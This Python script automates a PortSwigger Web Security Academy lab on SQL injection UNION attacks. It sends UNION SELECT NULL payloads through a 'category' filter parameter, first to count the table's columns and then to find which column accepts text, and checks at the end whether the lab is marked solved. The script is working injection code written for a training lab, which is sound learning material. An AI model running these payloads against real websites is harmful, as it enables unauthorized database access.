import requests
import argparse
import re


parser = argparse.ArgumentParser(description='Solves the following Lab: SQL injection UNION attack, finding a column containing text')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()
r = requests.get("https://" + lab.id + f".web-security-academy.net/")
STRING = re.findall(r"'(.*?)'", r.text)[1]

# ENUMERATE TOTAL COLUMNS
for i in range(27, 0, -1):
    r = requests.get("https://" + lab.id + f".web-security-academy.net/filter?category='UNION SELECT {('NULL,'*i)[:-1]}-- -")
    print(f"Checking if table has {i} columns.")
    if r.status_code != 500:
        print(f"The database has {i} columns.")
        COLUMNS = i
        break

# GENERATE DIAGONAL MATRIX WITH STRINGS
matrix = [["NULL"]*COLUMNS for _ in range(COLUMNS)]
for i in range(COLUMNS):
        matrix[i][i] = STRING

# BRUTEFORCE COLUMNS CONTAINING STRINGS
for i in range(COLUMNS):
        r = requests.get("https://" + lab.id + f".web-security-academy.net/filter?category='UNION SELECT {matrix[i]}-- -".replace("[", "").replace("]", "").replace("'NULL'", "NULL"))
        if r.status_code == 200:
              print(f"Column {i+1} holds string values:\n""https://" + lab.id + f".web-security-academy.net/filter?category='UNION SELECT {matrix[i]}-- -".replace("[", "").replace("]", "").replace("'NULL'", "NULL"))

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")